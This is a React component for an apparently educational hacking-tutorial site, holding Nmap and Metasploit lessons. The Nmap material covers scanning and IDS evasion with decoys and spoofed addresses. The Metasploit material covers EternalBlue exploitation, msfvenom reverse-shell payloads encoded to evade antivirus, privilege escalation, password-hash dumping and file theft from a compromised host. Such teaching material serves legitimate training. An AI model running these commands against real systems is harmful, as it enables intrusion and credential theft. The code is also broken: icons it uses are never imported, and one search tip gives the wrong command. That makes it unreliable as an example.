import { useState } from "react";
import { Shield, ArrowLeft, Terminal, Code, Lock, Activity, Database, Copy, Check } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface AdvancedTutorialsPageProps {
  onBackToDashboard: () => void;
}

interface Tutorial {
  id: string;
  name: string;
  category: string;
  icon: React.ReactNode;
  description: string;
  difficulty: "Advanced" | "Expert" | "Professional";
  duration: string;
  prerequisites: string[];
  learningObjectives: string[];
  commandSections: {
    title: string;
    description: string;
    commands: {
      command: string;
      explanation: string;
      example?: string;
      output?: string;
      tips?: string[];
    }[];
  }[];
  practiceScenarios: {
    scenario: string;
    solution: string;
    explanation: string;
  }[];
  isComingSoon?: boolean;
}

export function AdvancedTutorialsPage({ onBackToDashboard }: AdvancedTutorialsPageProps) {
  const [expandedTutorial, setExpandedTutorial] = useState<string | null>(null);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCommand(id);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  const tutorials: Tutorial[] = [
    {
      id: "nmap-mastery",
      name: "Nmap Mastery",
      category: "Network Reconnaissance",
      icon: <Activity className="w-12 h-12" />,
      difficulty: "Advanced",
      duration: "2-3 hours",
      description: "Master the art of network reconnaissance with Nmap. This comprehensive tutorial covers everything from basic port scanning to advanced NSE scripting, stealth techniques, and evasion tactics used by professional penetration testers.",
      prerequisites: [
        "Basic understanding of TCP/IP networking",
        "Familiarity with Linux/Unix command line",
        "Knowledge of common network ports and services",
        "Understanding of firewall concepts",
        "Basic networking tools experience (ping, traceroute)"
      ],
      learningObjectives: [
        "Master all Nmap scan types and when to use them",
        "Understand stealth scanning and IDS/firewall evasion",
        "Utilize NSE scripts for vulnerability detection",
        "Optimize scan timing and performance",
        "Interpret and analyze scan results effectively",
        "Create custom Nmap scanning strategies"
      ],
      commandSections: [
        {
          title: "Basic Scanning Techniques",
          description: "Foundation scanning commands every penetration tester must know",
          commands: [
            {
              command: "nmap 192.168.1.1",
              explanation: "Basic scan of top 1000 most common ports on a single target",
              example: "nmap 192.168.1.100",
              output: "Starting Nmap scan...\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https",
              tips: [
                "This is the simplest form of Nmap scan",
                "Only scans the 1000 most commonly used ports",
                "Quick but may miss services on unusual ports"
              ]
            },
            {
              command: "nmap -p- [target]",
              explanation: "Scan ALL 65535 ports - comprehensive but time-consuming",
              example: "nmap -p- 192.168.1.100",
              output: "Scanning all 65535 ports...\nThis may take several minutes...",
              tips: [
                "Use this when you need complete port coverage",
                "Can take 20-30 minutes per host",
                "Combine with -T4 for faster scanning"
              ]
            },
            {
              command: "nmap -p 80,443,8080,8443 [target]",
              explanation: "Scan specific ports only - efficient and targeted",
              example: "nmap -p 80,443,8080,8443 10.0.0.1",
              tips: [
                "Scan only ports you're interested in",
                "Much faster than full scans",
                "Good for web server assessments"
              ]
            },
            {
              command: "nmap 192.168.1.0/24",
              explanation: "Scan entire subnet using CIDR notation",
              example: "nmap 192.168.1.0/24",
              output: "Nmap scan report for 192.168.1.1\nNmap scan report for 192.168.1.100\n...",
              tips: [
                "Scans all 254 hosts in the subnet",
                "Use -sn for ping sweep only",
                "Can generate significant network traffic"
              ]
            }
          ]
        },
        {
          title: "Advanced Scan Types",
          description: "Different scanning techniques for various scenarios and defenses",
          commands: [
            {
              command: "nmap -sS [target]",
              explanation: "SYN Stealth Scan - half-open scan that doesn't complete TCP handshake",
              example: "sudo nmap -sS 192.168.1.100",
              output: "Requires root privileges\nPerforming SYN Stealth Scan...",
              tips: [
                "Most popular scan type - fast and stealthy",
                "Requires root/administrator privileges",
                "Less likely to be logged by target systems",
                "Default scan type when run as root"
              ]
            },
            {
              command: "nmap -sT [target]",
              explanation: "TCP Connect Scan - completes full TCP three-way handshake",
              example: "nmap -sT 192.168.1.100",
              tips: [
                "Works without root privileges",
                "More likely to be detected and logged",
                "Use when SYN scan is not available",
                "Slower than SYN scan"
              ]
            },
            {
              command: "nmap -sU [target]",
              explanation: "UDP Scan - scans UDP ports instead of TCP",
              example: "sudo nmap -sU -p 53,161,500 192.168.1.100",
              output: "Scanning UDP ports...\n53/udp   open  domain\n161/udp  open  snmp",
              tips: [
                "UDP scanning is much slower than TCP",
                "Many services use UDP (DNS, SNMP, VPN)",
                "Combine with version detection: -sUV",
                "Often overlooked but critical for security"
              ]
            },
            {
              command: "nmap -sN -sF -sX [target]",
              explanation: "NULL, FIN, and XMAS scans - stealth scans that exploit TCP flags",
              example: "sudo nmap -sN 192.168.1.100",
              tips: [
                "Can bypass some firewalls",
                "May not work against Windows systems",
                "Useful for IDS evasion",
                "Good for testing firewall rules"
              ]
            }
          ]
        },
        {
          title: "Service and OS Detection",
          description: "Identifying what's actually running on open ports",
          commands: [
            {
              command: "nmap -sV [target]",
              explanation: "Service Version Detection - identifies software versions",
              example: "nmap -sV 192.168.1.100",
              output: "22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41",
              tips: [
                "Essential for vulnerability assessment",
                "Can increase scan time significantly",
                "Use --version-intensity 0-9 to control thoroughness",
                "Default intensity is 7"
              ]
            },
            {
              command: "nmap -O [target]",
              explanation: "Operating System Detection using TCP/IP stack fingerprinting",
              example: "sudo nmap -O 192.168.1.100",
              output: "OS details: Linux 4.15 - 5.6\nOS CPE: cpe:/o:linux:linux_kernel:5.4",
              tips: [
                "Requires root privileges",
                "Needs at least one open and one closed port",
                "Accuracy depends on target responses",
                "Combine with -v for more details"
              ]
            },
            {
              command: "nmap -A [target]",
              explanation: "Aggressive scan - enables OS detection, version detection, script scanning, and traceroute",
              example: "sudo nmap -A 192.168.1.100",
              tips: [
                "Combines -O, -sV, -sC, and --traceroute",
                "Very thorough but also very noisy",
                "Easy to detect by IDS/IPS",
                "Great for comprehensive assessment"
              ]
            }
          ]
        },
        {
          title: "NSE Script Engine",
          description: "Leveraging Nmap's powerful scripting capabilities",
          commands: [
            {
              command: "nmap -sC [target]",
              explanation: "Run default NSE scripts - safe and useful scripts",
              example: "nmap -sC 192.168.1.100",
              tips: [
                "Runs ~100 default scripts",
                "Equivalent to --script=default",
                "Scripts are categorized: safe, intrusive, etc."
              ]
            },
            {
              command: "nmap --script=vuln [target]",
              explanation: "Run vulnerability detection scripts",
              example: "nmap --script=vuln 192.168.1.100",
              output: "| vulners:\n|   CVE-2021-3156 - Sudo Heap Overflow\n|   CVE-2019-6111 - OpenSSH SCP Vulnerability",
              tips: [
                "Checks for known vulnerabilities",
                "Can be intrusive - use carefully",
                "May trigger security alerts",
                "Great for initial vulnerability assessment"
              ]
            },
            {
              command: "nmap --script=http-enum [target]",
              explanation: "Enumerate web directories and files",
              example: "nmap -p 80 --script=http-enum 192.168.1.100",
              output: "| http-enum:\n|   /admin/: Admin panel\n|   /backup/: Backup files\n|   /phpmyadmin/: Database admin",
              tips: [
                "Finds common web directories",
                "Can discover hidden admin panels",
                "Useful for web application testing"
              ]
            },
            {
              command: "nmap --script=ssl-enum-ciphers -p 443 [target]",
              explanation: "Enumerate SSL/TLS cipher suites and check for weak encryption",
              example: "nmap --script=ssl-enum-ciphers -p 443 example.com",
              tips: [
                "Identifies weak SSL/TLS configurations",
                "Tests for outdated protocols (SSLv2, SSLv3)",
                "Important for compliance testing"
              ]
            },
            {
              command: "nmap --script='smb-vuln-*' [target]",
              explanation: "Check for SMB vulnerabilities (like EternalBlue)",
              example: "nmap --script='smb-vuln-*' -p 445 192.168.1.100",
              tips: [
                "Checks for SMB exploits",
                "Can detect EternalBlue (MS17-010)",
                "Critical for Windows security assessment"
              ]
            }
          ]
        },
        {
          title: "Stealth and Evasion Techniques",
          description: "Avoid detection by firewalls, IDS, and IPS systems",
          commands: [
            {
              command: "nmap -f [target]",
              explanation: "Fragment packets to evade packet filters",
              example: "nmap -f 192.168.1.100",
              tips: [
                "Splits packets into 8-byte fragments",
                "Can bypass simple packet filters",
                "Use -ff for 16-byte fragments",
                "May not work against modern firewalls"
              ]
            },
            {
              command: "nmap -D RND:10 [target]",
              explanation: "Use 10 random decoy IP addresses to hide your real IP",
              example: "nmap -D RND:10 192.168.1.100",
              tips: [
                "Makes it harder to identify attacker",
                "Target sees scans from multiple IPs",
                "Can specify specific decoy IPs",
                "Use with caution - can cause collateral issues"
              ]
            },
            {
              command: "nmap -S [spoofed-ip] [target]",
              explanation: "Spoof source IP address",
              example: "nmap -S 192.168.1.50 -e eth0 -Pn 192.168.1.100",
              tips: [
                "Requires raw packet privileges",
                "Must specify network interface with -e",
                "You won't receive responses",
                "Useful for testing firewall rules"
              ]
            },
            {
              command: "nmap --data-length 25 [target]",
              explanation: "Append random data to packets to change packet size",
              example: "nmap --data-length 25 192.168.1.100",
              tips: [
                "Evades signature-based detection",
                "Changes packet fingerprint",
                "Can bypass some IDS rules"
              ]
            },
            {
              command: "nmap -T0 [target]",
              explanation: "Paranoid timing - extremely slow (one packet every 5 minutes)",
              example: "nmap -T0 192.168.1.100",
              tips: [
                "T0-T5 timing templates available",
                "T0: Paranoid (IDS evasion)",
                "T1: Sneaky, T2: Polite, T3: Normal",
                "T4: Aggressive, T5: Insane",
                "Use T4 for fast scans, T0-T1 for stealth"
              ]
            }
          ]
        },
        {
          title: "Output and Reporting",
          description: "Saving and formatting scan results for analysis",
          commands: [
            {
              command: "nmap -oN output.txt [target]",
              explanation: "Normal output format - human-readable text file",
              example: "nmap -oN scan_results.txt 192.168.1.0/24",
              tips: [
                "Easy to read and share",
                "Good for reports and documentation"
              ]
            },
            {
              command: "nmap -oX output.xml [target]",
              explanation: "XML output - machine-readable for further processing",
              example: "nmap -oX scan.xml 192.168.1.100",
              tips: [
                "Can be imported into other tools",
                "Parse with scripts for automation",
                "Required for many security tools"
              ]
            },
            {
              command: "nmap -oG output.gnmap [target]",
              explanation: "Grepable output - easy to search with grep/awk",
              example: "nmap -oG scan.gnmap 192.168.1.0/24",
              tips: [
                "Perfect for command-line parsing",
                "Each line is one host",
                "Easy to filter with grep"
              ]
            },
            {
              command: "nmap -oA basename [target]",
              explanation: "Output in all three formats at once",
              example: "nmap -oA company_scan 192.168.1.0/24",
              tips: [
                "Creates .nmap, .xml, and .gnmap files",
                "Best practice for professional assessments",
                "Ensures you have all format options"
              ]
            }
          ]
        }
      ],
      practiceScenarios: [
        {
          scenario: "You need to scan a web server (192.168.1.50) quickly during a limited testing window. Find open web ports and identify the web server version without being too noisy.",
          solution: "nmap -p 80,443,8080,8443 -sV -T4 192.168.1.50",
          explanation: "This scans only common web ports (-p 80,443,8080,8443), detects service versions (-sV), and uses aggressive timing (-T4) for speed. It's targeted and efficient for the scenario."
        },
        {
          scenario: "Perform a comprehensive security assessment of 10.0.0.100 including OS detection, service versions, and vulnerability checks. You have permission and time is not a concern.",
          solution: "sudo nmap -A -sV --script=vuln -p- -oA full_assessment 10.0.0.100",
          explanation: "Combines aggressive scan (-A), version detection (-sV), vulnerability scripts (--script=vuln), all ports (-p-), and saves in all formats (-oA). This is a thorough professional assessment."
        },
        {
          scenario: "You suspect a target (172.16.0.10) has a firewall. Scan stealthily without triggering IDS alerts and hide your source IP among decoys.",
          solution: "sudo nmap -sS -f -D RND:15 -T1 --data-length 30 172.16.0.10",
          explanation: "Uses SYN stealth scan (-sS), fragments packets (-f), adds 15 random decoys (-D RND:15), slow timing (-T1), and random data (--data-length 30) for maximum stealth."
        },
        {
          scenario: "Scan an entire corporate network (192.168.0.0/16) to create an inventory of all live hosts and their primary services. The scan should be comprehensive but non-intrusive.",
          solution: "nmap -sn 192.168.0.0/16 -oG live_hosts.txt && nmap -iL live_hosts.txt -sV -T3 -oA network_inventory",
          explanation: "First performs a ping sweep (-sn) to find live hosts, then scans those hosts for services. This two-phase approach is efficient for large networks and avoids wasting time on dead hosts."
        }
      ]
    },
    {
      id: "metasploit-framework",
      name: "Metasploit Framework Deep Dive",
      category: "Exploitation",
      icon: <Terminal className="w-12 h-12" />,
      difficulty: "Expert",
      duration: "3-4 hours",
      description: "Complete mastery of Metasploit Framework from reconnaissance to post-exploitation. Learn to chain exploits, use Meterpreter like a pro, and conduct full penetration tests using the world's most powerful exploitation framework.",
      prerequisites: [
        "Solid understanding of networking and protocols",
        "Experience with Linux command line",
        "Basic knowledge of exploit development concepts",
        "Understanding of common vulnerabilities (SQLi, RCE, etc.)",
        "Familiarity with privilege escalation techniques"
      ],
      learningObjectives: [
        "Master Metasploit console (msfconsole) commands",
        "Understand exploit module structure and selection",
        "Configure and execute exploits effectively",
        "Use Meterpreter for post-exploitation",
        "Chain multiple exploits for complete compromise",
        "Conduct professional penetration tests with Metasploit"
      ],
      commandSections: [
        {
          title: "Getting Started with MSFConsole",
          description: "Essential commands for navigating Metasploit Framework",
          commands: [
            {
              command: "msfconsole",
              explanation: "Launch the Metasploit Framework console",
              output: "       =[ metasploit v6.x.x ]\n+ -- --=[ 2234 exploits - 1184 auxiliary - 404 post ]\n+ -- --=[ 596 payloads - 46 encoders - 11 nops ]\nmsf6 >",
              tips: [
                "Main interface for Metasploit",
                "Can take 10-20 seconds to load",
                "Use 'msfconsole -q' for quiet mode (no banner)"
              ]
            },
            {
              command: "search [keyword]",
              explanation: "Search for modules (exploits, auxiliaries, payloads)",
              example: "search apache",
              output: "Matching Modules\n================\n   Name                           Disclosure Date  Rank\n   ----                           ---------------  ----\n   exploit/unix/webapp/apache_... 2021-09-15       excellent",
              tips: [
                "Search by CVE: 'search cve:2021-44228'",
                "Search by platform: 'search type:exploit platform:linux'",
                "Search by date: 'search apache type:exploit'",
                "Use 'info [module]' to get details"
              ]
            },
            {
              command: "use [module-path]",
              explanation: "Select a module to configure and use",
              example: "use exploit/windows/smb/ms17_010_eternalblue",
              output: "msf6 exploit(windows/smb/ms17_010_eternalblue) >",
              tips: [
                "Tab completion works!",
                "Prompt changes to show current module",
                "Use 'back' to return to main prompt"
              ]
            },
            {
              command: "show options",
              explanation: "Display all configurable options for current module",
              output: "Module options:\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   RHOSTS                      yes       Target address\n   RPORT      445              yes       Target port",
              tips: [
                "REQUIRED options must be set",
                "Optional settings have defaults",
                "Pay attention to 'Current Setting' column"
              ]
            },
            {
              command: "set [OPTION] [value]",
              explanation: "Configure module options",
              example: "set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50",
              tips: [
                "RHOSTS = Remote/Target host(s)",
                "LHOST = Local host (your IP for reverse shells)",
                "LPORT = Local port for connections",
                "Use 'setg' to set global values"
              ]
            },
            {
              command: "exploit / run",
              explanation: "Execute the configured module",
              example: "exploit",
              output: "[*] Started reverse TCP handler\n[*] Sending stage...\n[*] Meterpreter session 1 opened",
              tips: [
                "'exploit' and 'run' are identical",
                "Use 'exploit -j' to run as background job",
                "Use 'exploit -z' to not interact with session",
                "Ctrl+C to stop running exploit"
              ]
            }
          ]
        },
        {
          title: "Working with Payloads",
          description: "Understanding and selecting the right payload for your attack",
          commands: [
            {
              command: "show payloads",
              explanation: "List compatible payloads for current exploit",
              output: "Compatible Payloads\n===================\n   Name                               Rank\n   ----                               ----\n   windows/x64/meterpreter/reverse_tcp  normal\n   windows/x64/shell/reverse_tcp        normal",
              tips: [
                "Only shown after selecting an exploit",
                "Meterpreter payloads are most powerful",
                "Match architecture (x86 vs x64)",
                "Consider staged vs non-staged"
              ]
            },
            {
              command: "set PAYLOAD [payload-path]",
              explanation: "Select a specific payload for the exploit",
              example: "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
              tips: [
                "Meterpreter = advanced post-exploitation",
                "shell/* = basic command shell",
                "reverse_tcp = connects back to you",
                "bind_tcp = opens port on target"
              ]
            },
            {
              command: "generate -f exe -o payload.exe",
              explanation: "Generate standalone payload file",
              example: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe",
              tips: [
                "Use msfvenom (not msfpayload)",
                "Encode to avoid AV: -e x86/shikata_ga_nai",
                "Multiple iterations: -i 10",
                "Different formats: -f exe, elf, php, asp, war"
              ]
            }
          ]
        },
        {
          title: "Meterpreter Commands",
          description: "Post-exploitation with Meterpreter advanced payload",
          commands: [
            {
              command: "sysinfo",
              explanation: "Get system information about compromised machine",
              output: "Computer        : WORKSTATION01\nOS              : Windows 10 (10.0 Build 19044)\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : x64/windows",
              tips: [
                "First command to run after getting session",
                "Confirms exploit success",
                "Shows architecture for further exploits"
              ]
            },
            {
              command: "getuid",
              explanation: "Get current user context",
              output: "Server username: NT AUTHORITY\\SYSTEM",
              tips: [
                "Shows privilege level",
                "SYSTEM = highest Windows privilege",
                "If not SYSTEM, need privilege escalation"
              ]
            },
            {
              command: "ps",
              explanation: "List running processes",
              output: "PID   PPID  Name               Arch  Session  User\n---   ----  ----               ----  -------  ----\n1234  456   explorer.exe       x64   1        WORKSTATION\\user",
              tips: [
                "Find processes to migrate to",
                "Look for processes running as SYSTEM",
                "Useful for finding interesting applications"
              ]
            },
            {
              command: "migrate [PID]",
              explanation: "Migrate Meterpreter to another process",
              example: "migrate 2856",
              tips: [
                "Improves persistence",
                "Avoid unstable processes",
                "Migrate to native process for stability",
                "Match architecture (x86 to x86, x64 to x64)"
              ]
            },
            {
              command: "hashdump",
              explanation: "Dump password hashes from SAM database",
              output: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nuser:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
              tips: [
                "Requires SYSTEM or Administrator privileges",
                "Hashes can be cracked offline",
                "Use with post/windows/gather/hashdump",
                "NTLM hashes can be used for pass-the-hash"
              ]
            },
            {
              command: "screenshot",
              explanation: "Capture screenshot of target's desktop",
              output: "Screenshot saved to: /home/kali/screenshot.jpeg",
              tips: [
                "Good for proving access in reports",
                "Can run repeatedly to monitor activity",
                "Saved to Metasploit directory"
              ]
            },
            {
              command: "download [remote-file] [local-path]",
              explanation: "Download file from target to attacker machine",
              example: "download c:\\\\users\\\\admin\\\\documents\\\\passwords.xlsx /root/loot/",
              tips: [
                "Use double backslashes for Windows paths",
                "Can download entire directories",
                "Opposite command is 'upload'"
              ]
            },
            {
              command: "shell",
              explanation: "Drop into interactive system shell",
              output: "Process 3456 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.19044]\nC:\\\\Windows\\\\system32>",
              tips: [
                "Gives you cmd.exe or /bin/bash",
                "Ctrl+Z to return to Meterpreter",
                "Less stable than Meterpreter commands",
                "Use for commands not in Meterpreter"
              ]
            },
            {
              command: "run post/windows/gather/checkvm",
              explanation: "Check if target is a virtual machine",
              tips: [
                "Post modules gather information",
                "Important for avoiding sandboxes",
                "Many post modules available",
                "Use 'search post/' to find more"
              ]
            },
            {
              command: "getsystem",
              explanation: "Attempt to elevate to SYSTEM privileges",
              output: "[*] Trying technique 1...\n[+] Success! Now running as SYSTEM",
              tips: [
                "Automated privilege escalation",
                "Uses multiple techniques",
                "May not work on patched systems",
                "Alternative: use exploit suggester"
              ]
            }
          ]
        },
        {
          title: "Database and Workspaces",
          description: "Organizing penetration test data professionally",
          commands: [
            {
              command: "db_status",
              explanation: "Check database connection status",
              output: "[*] Connected to msf database: msf\n[*] Using database: postgresql",
              tips: [
                "Database stores all scan/exploit data",
                "Required for many advanced features",
                "Run 'msfdb init' if not connected"
              ]
            },
            {
              command: "workspace -a [name]",
              explanation: "Create new workspace for organizing different projects/clients",
              example: "workspace -a client_pentest_2026",
              tips: [
                "Keep different engagements separate",
                "Professional organization",
                "Switch with: workspace [name]",
                "List with: workspace"
              ]
            },
            {
              command: "hosts",
              explanation: "List all discovered hosts in current workspace",
              output: "Hosts\n=====\n\naddress         mac        name      os_name\n-------         ---        ----      -------\n192.168.1.100   00:0c:29:...  server01  Microsoft Windows",
              tips: [
                "Populated by scans and exploits",
                "Use 'hosts -d' to delete",
                "Filter with 'hosts -S linux'"
              ]
            },
            {
              command: "services",
              explanation: "List discovered services on target hosts",
              tips: [
                "Shows open ports and services",
                "Helps identify attack surface",
                "Updated automatically during scans"
              ]
            },
            {
              command: "db_import [nmap-xml-file]",
              explanation: "Import Nmap XML scan results into Metasploit database",
              example: "db_import /root/scans/network_scan.xml",
              tips: [
                "Integrates Nmap with Metasploit",
                "Automatically populates hosts/services",
                "Must be XML format (-oX in Nmap)"
              ]
            }
          ]
        }
      ],
      practiceScenarios: [
        {
          scenario: "You've discovered a Windows 7 machine (10.0.0.50) vulnerable to MS17-010 (EternalBlue). Exploit it and obtain SYSTEM privileges, then dump password hashes.",
          solution: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST [your-ip]\nexploit\n\n# After getting Meterpreter:\ngetuid\ngetsystem\nhashdump",
          explanation: "This exploits the EternalBlue vulnerability, gets a Meterpreter session, escalates to SYSTEM if needed, and dumps the password hashes for offline cracking or pass-the-hash attacks."
        },
        {
          scenario: "Setup a professional penetration test workspace for 'ACME Corp', import an Nmap scan (acme_scan.xml), and identify Windows SMB hosts to target.",
          solution: "workspace -a acme_corp_2026\ndb_import /root/scans/acme_scan.xml\nservices -p 445\nhosts -S windows",
          explanation: "Creates isolated workspace, imports recon data, filters for SMB service (port 445), and lists Windows hosts - professional penetration testing workflow."
        },
        {
          scenario: "You have a Meterpreter session but it's unstable in a web server process. Find and migrate to a more stable process, preferably running as SYSTEM.",
          solution: "ps\n# Look for a stable process running as SYSTEM (like lsass.exe or services.exe)\nmigrate [PID-of-stable-process]\ngetuid  # Verify privilege level",
          explanation: "Lists processes, identifies stable SYSTEM process, migrates Meterpreter into it for better stability and persistence. Web processes often crash, while system services are stable."
        }
      ]
    },
    {
      id: "coming-1",
      name: "Advanced SQL Injection",
      category: "Web Exploitation",
      icon: <Database className="w-12 h-12" />,
      difficulty: "Expert",
      duration: "4-5 hours",
      description: "Master advanced SQL injection techniques including blind SQLi, time-based attacks, and out-of-band exploitation.",
      prerequisites: [],
      learningObjectives: [],
      commandSections: [],
      practiceScenarios: [],
      isComingSoon: true
    },
    {
      id: "coming-2",
      name: "Privilege Escalation Masterclass",
      category: "Post-Exploitation",
      icon: <Lock className="w-12 h-12" />,
      difficulty: "Professional",
      duration: "5-6 hours",
      description: "Complete guide to privilege escalation on Linux and Windows systems using manual and automated techniques.",
      prerequisites: [],
      learningObjectives: [],
      commandSections: [],
      practiceScenarios: [],
      isComingSoon: true
    }
  ];

  const toggleTutorial = (tutorialId: string) => {
    if (tutorials.find(t => t.id === tutorialId)?.isComingSoon) return;
    setExpandedTutorial(expandedTutorial === tutorialId ? null : tutorialId);
  };

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case "Advanced": return "text-yellow-500 border-yellow-500";
      case "Expert": return "text-orange-500 border-orange-500";
      case "Professional": return "text-red-500 border-red-500";
      default: return "text-green-500 border-green-500";
    }
  };

  return (
    <div className="min-h-screen bg-black relative overflow-hidden">
      {/* Animated Matrix Background */}
      <div className="absolute inset-0 opacity-10">
        <div className="matrix-rain"></div>
      </div>

      {/* Back Button */}
      <motion.button
        initial={{ opacity: 0, x: -20 }}
        animate={{ opacity: 1, x: 0 }}
        onClick={onBackToDashboard}
        className="absolute top-8 left-8 z-20 flex items-center gap-2 text-green-500 hover:text-green-400 transition-colors font-mono"
      >
        <ArrowLeft className="w-5 h-5" />
        BACK TO DASHBOARD
      </motion.button>

      {/* Main Content */}
      <div className="relative z-10 px-4 md:px-8 py-20">
        <div className="max-w-7xl mx-auto">
          {/* Header */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-center mb-16"
          >
            <div className="flex justify-center mb-6">
              <div className="relative">
                <Code className="w-24 h-24 text-green-500 animate-pulse" />
                <div className="absolute inset-0 bg-green-500 blur-2xl opacity-20"></div>
              </div>
            </div>
            <h1 className="text-5xl md:text-7xl font-bold text-green-500 font-mono mb-4">
              ADVANCED TUTORIALS
            </h1>
            <p className="text-green-400 font-mono text-lg mb-2">
              {"> IN-DEPTH COMMAND-LINE MASTERY FOR PROFESSIONALS_"}
            </p>
            <p className="text-cyan-500 font-mono text-sm">
              ⚡ COMPREHENSIVE GUIDES WITH REAL EXAMPLES AND SCENARIOS
            </p>
            <div className="mt-6 h-px bg-gradient-to-r from-transparent via-green-500 to-transparent"></div>
          </motion.div>

          {/* Tutorials List */}
          <div className="space-y-8">
            {tutorials.map((tutorial, index) => (
              <motion.div
                key={tutorial.id}
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.15 + 0.2 }}
                className={`border-2 ${tutorial.isComingSoon ? 'border-gray-500/30' : 'border-green-500/30'} bg-black/90 backdrop-blur ${!tutorial.isComingSoon && 'hover:border-green-500 hover:shadow-[0_0_40px_rgba(0,255,0,0.2)]'} transition-all`}
              >
                {tutorial.isComingSoon ? (
                  // Coming Soon Card
                  <div className="p-8">
                    <div className="flex items-center gap-6 opacity-60">
                      <div className="text-gray-500">
                        {tutorial.icon}
                      </div>
                      <div className="flex-1">
                        <h2 className="text-3xl font-bold text-gray-500 font-mono mb-2">
                          {tutorial.name}
                        </h2>
                        <p className="text-gray-600 font-mono text-sm mb-3">{tutorial.category}</p>
                        <div className="flex gap-3 mb-3">
                          <span className={`px-3 py-1 border ${getDifficultyColor(tutorial.difficulty)} opacity-50 font-mono text-xs`}>
                            {tutorial.difficulty.toUpperCase()}
                          </span>
                          <span className="px-3 py-1 border border-gray-600 text-gray-600 font-mono text-xs">
                            {tutorial.duration}
                          </span>
                        </div>
                        <p className="text-gray-600 italic">{tutorial.description}</p>
                      </div>
                      <div className="flex-shrink-0">
                        <Shield className="w-16 h-16 text-gray-600 animate-pulse" />
                        <p className="text-gray-500 font-mono text-xs mt-2 text-center">COMING SOON</p>
                      </div>
                    </div>
                  </div>
                ) : (
                  // Active Tutorial Card
                  <>
                    {/* Tutorial Header */}
                    <div
                      onClick={() => toggleTutorial(tutorial.id)}
                      className="p-8 cursor-pointer group"
                    >
                      <div className="flex items-start gap-6">
                        <div className="text-green-500 group-hover:scale-110 transition-transform">
                          {tutorial.icon}
                        </div>
                        <div className="flex-1">
                          <div className="flex items-start justify-between mb-4">
                            <div>
                              <h2 className="text-3xl md:text-4xl font-bold text-green-500 font-mono group-hover:text-green-400 transition-colors mb-2">
                                {tutorial.name}
                              </h2>
                              <p className="text-green-400/80 font-mono mb-3">{tutorial.category}</p>
                            </div>
                            <div>
                              {expandedTutorial === tutorial.id ? (
                                <ChevronUp className="w-8 h-8 text-green-500" />
                              ) : (
                                <ChevronDown className="w-8 h-8 text-green-500 animate-bounce" />
                              )}
                            </div>
                          </div>

                          <div className="flex flex-wrap gap-3 mb-4">
                            <span className={`px-4 py-2 border ${getDifficultyColor(tutorial.difficulty)} bg-black/50 font-mono text-sm font-bold`}>
                              {tutorial.difficulty.toUpperCase()}
                            </span>
                            <span className="px-4 py-2 border border-cyan-500 bg-cyan-500/10 text-cyan-400 font-mono text-sm">
                              ⏱ {tutorial.duration}
                            </span>
                          </div>

                          <p className="text-gray-300 leading-relaxed text-lg">
                            {tutorial.description}
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Tutorial Content - Expandable */}
                    <AnimatePresence>
                      {expandedTutorial === tutorial.id && (
                        <motion.div
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: "auto" }}
                          exit={{ opacity: 0, height: 0 }}
                          transition={{ duration: 0.4 }}
                          className="border-t-2 border-green-500/30"
                        >
                          <div className="p-8 space-y-10">
                            {/* Prerequisites */}
                            <div className="border-2 border-yellow-500/30 bg-yellow-500/5 p-6">
                              <h3 className="text-2xl font-bold text-yellow-500 font-mono mb-4">
                                📋 PREREQUISITES
                              </h3>
                              <ul className="space-y-2">
                                {tutorial.prerequisites.map((prereq, idx) => (
                                  <li key={idx} className="flex items-start gap-3">
                                    <span className="text-yellow-500 font-mono mt-1">✓</span>
                                    <span className="text-gray-300">{prereq}</span>
                                  </li>
                                ))}
                              </ul>
                            </div>

                            {/* Learning Objectives */}
                            <div className="border-2 border-cyan-500/30 bg-cyan-500/5 p-6">
                              <h3 className="text-2xl font-bold text-cyan-500 font-mono mb-4">
                                🎯 LEARNING OBJECTIVES
                              </h3>
                              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                {tutorial.learningObjectives.map((objective, idx) => (
                                  <div key={idx} className="flex items-start gap-3 border border-cyan-500/20 bg-cyan-500/5 p-3">
                                    <span className="text-cyan-500 font-mono">▸</span>
                                    <span className="text-gray-300 text-sm">{objective}</span>
                                  </div>
                                ))}
                              </div>
                            </div>

                            {/* Command Sections */}
                            {tutorial.commandSections.map((section, sectionIdx) => (
                              <div key={sectionIdx} className="border-2 border-green-500/30 bg-green-500/5 p-6">
                                <h3 className="text-2xl font-bold text-green-500 font-mono mb-2">
                                  {section.title}
                                </h3>
                                <p className="text-gray-400 mb-6 italic">{section.description}</p>

                                <div className="space-y-6">
                                  {section.commands.map((cmd, cmdIdx) => (
                                    <div key={cmdIdx} className="border border-green-500/30 bg-black/70 p-5">
                                      {/* Command */}
                                      <div className="mb-3">
                                        <div className="flex items-center justify-between mb-2">
                                          <span className="text-xs text-gray-500 font-mono">COMMAND:</span>
                                          <button
                                            onClick={() => copyToClipboard(cmd.command, `${sectionIdx}-${cmdIdx}`)}
                                            className="text-green-500 hover:text-green-400 transition-colors"
                                          >
                                            {copiedCommand === `${sectionIdx}-${cmdIdx}` ? (
